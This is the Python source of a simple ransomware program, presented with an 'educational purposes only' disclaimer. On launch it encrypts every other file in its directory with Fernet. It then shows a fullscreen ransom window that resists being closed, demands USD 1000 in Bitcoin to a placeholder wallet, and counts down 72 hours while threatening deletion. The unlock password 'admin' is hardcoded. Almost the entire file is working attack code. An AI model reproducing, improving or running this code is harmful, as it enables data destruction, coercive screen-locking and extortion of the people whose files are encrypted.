'''
IMPORTANT DISCLAIMER:


This is for educational purposes only. I, as the creator of this ransomware, do not advocate
for the use of this software for illegal activities nor condone unauthorized hacking.

USE OF THIS SOFTWARE CAN POTENTIALLY BE HARMFUL WHICH CAN CAUSE COURT CHARGES WITHIN
THE UNITED STATES AND ABROAD.

Check README file for documentation of this software.



'''

import os
import platform
from cryptography.fernet import Fernet
from tkinter import *
from tkinter.font import *
import time

osType = platform.system()
# macos: "Darwin"
# Linux: "Linux"
# Windows: "Windows"


files = []
def collect():
  for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key":
      continue
    if os.path.isfile(file):
      files.append(file)

def _encrypt():
  # prevent double encryption:
  collect()
  print(files)
  if os.path.exists("thekey.key"):
    print("was already encrypted!")
    pass
  else:
    print("encrypting...")
    key = Fernet.generate_key()
    print(key)
    with open("thekey.key", "wb") as thekey:
      thekey.write(key)

    for file in files:
      with open(file, "rb") as thefile:
        contents = thefile.read()
      contents_encrpyted = Fernet(key).encrypt(contents)
      with open(file, "wb") as thefile:
        thefile.write(contents_encrpyted)


def _decrypt():
  print("decrypting")
  if os.path.exists("thekey.key"):
    with open("thekey.key","rb") as key:
      secretkey = key.read()
    for file in files:
      with open(file, "rb") as thefile:
        contents = thefile.read()
      contents_decrypted = Fernet(secretkey).decrypt(contents)
      with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
    
    # destroy key
    os.remove("thekey.key")
  else:
    print("key does not exist!")

#encrypt first before initializing tkinter
_encrypt()

# tkinter custom functions

def close_program():
  root.destroy()

def disable_event():
  pass

#main function
counter = 259200 # 72 hours

root = Tk()
root['background']='#213FFF'
root.title('[URGENT MESSAGE] YOUR FILES HAD BEEN ENCRYPTED!')
header_font = Font(family = 'Courier New', size=36)
subhead_font = Font(family = 'Courier New', size=18)
disclaimer_font = Font(family = 'Courier New', size=8)
status_pre = Label(text="File Status: ", font = subhead_font, fg='white', bg='#213FFF')
status = Label(text="Encrypted", font = subhead_font, fg='white', bg='#213FFF')

def tryKey(event):
  if str(usrInput.get()) == 'admin':
    _decrypt()
    status.config(text="Decrypted", font = subhead_font, fg='white', bg='#213FFF')
    print("decrypt success!")
    quit() #just close the file after success
  else:
      pass

# disable close buttons etc
if osType == 'Darwin':
  root.bind('<Return>', tryKey)
elif osType == 'Windows':
  root.bind('<Alt-F4>', disable_event)
  root.bind('<Escape>', disable_event)
  root.bind('<Return>', tryKey)
elif osType == 'Linux':
  pass
  # no implementation on linux yet!

clock_label = Label(text="", font = subhead_font, fg='white', bg='#213FFF')

def update_clock():
  global counter
  counter -= 1
  if counter < 0:
      return
  
  temp = counter
  hour = temp // 3600
  temp = temp % 3600
  minute = temp // 60
  sec = temp % 60
  
  time_text = f'{hour}h:{minute}m:{sec}s'
  # clock_label.configure(text='00h:00m:00s')
  clock_label.configure(text=time_text)
  root.after(1000, update_clock)


header = Label(text='Urgent Message! Your files had been encrypted!', font=header_font, fg='white', bg='#213FFF')
header.bind("<Button-1>", quit)
subhead0_text = 'Cause of encryption: UNKONWN. Possible: sys32_encrypt_ransomware.'
subhead1_text = 'To decrypt these files, send USD 1000.00 worth of BITCOIN to the following wallet:'
subhead2_text = '92snd91usnd19sx918wjxn19383hnx918shd198' # some random crap.
subhead3_text = 'Once the payment is confirmed, enter the key below:'

disclaimer_text = 'This is a simple ransomware for educational purposes only.'

subhead0 = Label(text=subhead0_text, font = subhead_font, fg='white', bg='#213FFF')
subhead1 = Label(text=subhead1_text, font = subhead_font, fg='white', bg='#213FFF')
subhead2 = Label(text=subhead2_text, font = subhead_font, fg='white', bg='#213FFF')
subhead3 = Label(text=subhead3_text, font = subhead_font, fg='white', bg='#213FFF')
disclaimer = Label(text=disclaimer_text, font=disclaimer_font, fg='white', bg='#213FFF')

inputlabel = Label(text='Enter Key:', font = subhead_font, fg='white', bg='#213FFF')
usrInput = Entry(root, bg='#213FFF', fg='white', width=60)
tryKeyBtn = Button(root, text='Enter Key', fg='white',highlightbackground='#213FFF', command=tryKey)
clk_label = Label(text='Time remaining before encrypted files get deleted: ',font = subhead_font, fg='white', bg='#213FFF')


btn = Button(root, text="Exit", command = quit)
header.place(x=100,y=100)
subhead0.place(x=100, y= 250)
subhead1.place(x=100, y= 280)
subhead2.place(x=100, y= 310)

listing = Label(text='---------- Encrypted Files ----------', font = subhead_font, fg='white', bg='#213FFF')
listing.place(x=100, y= 350)

def list_files():
  num_files = len(files)
  label_list = []
  for file_no in range(num_files):
    if file_no > 8:
      continue

    file_name = str(files[file_no])
    label_text = f"{file_no+1}: {file_name}"
    y_coord = 350 + (file_no+1)*25
    label_list.append(Label(text=label_text, font = subhead_font, fg='white', bg='#213FFF'))
    label_list[file_no].place(x=100, y=y_coord)
  end_list = Label(text='-------------------------------------', font = subhead_font, fg='white', bg='#213FFF')
  end_list.place(x=100, y=(350 + (num_files+1)*25))
list_files()

subhead3.place(x=100, y= 710)
inputlabel.place(x=100, y=750)
usrInput.place(x=220, y=750)
# tryKeyBtn.place(x=780,y=650)

clk_label.place(x=100, y=820)
clock_label.place(x=100, y= 850)

status_pre.place(x=100, y=950)
status.place(x=280,y=950)
disclaimer.place(x=1500, y=1000)


# btn.pack()

root.attributes('-fullscreen', True)
root.protocol("WM_DELETE_WINDOW", disable_event)
root.resizable(0,0)
update_clock()
root.mainloop()
  
  
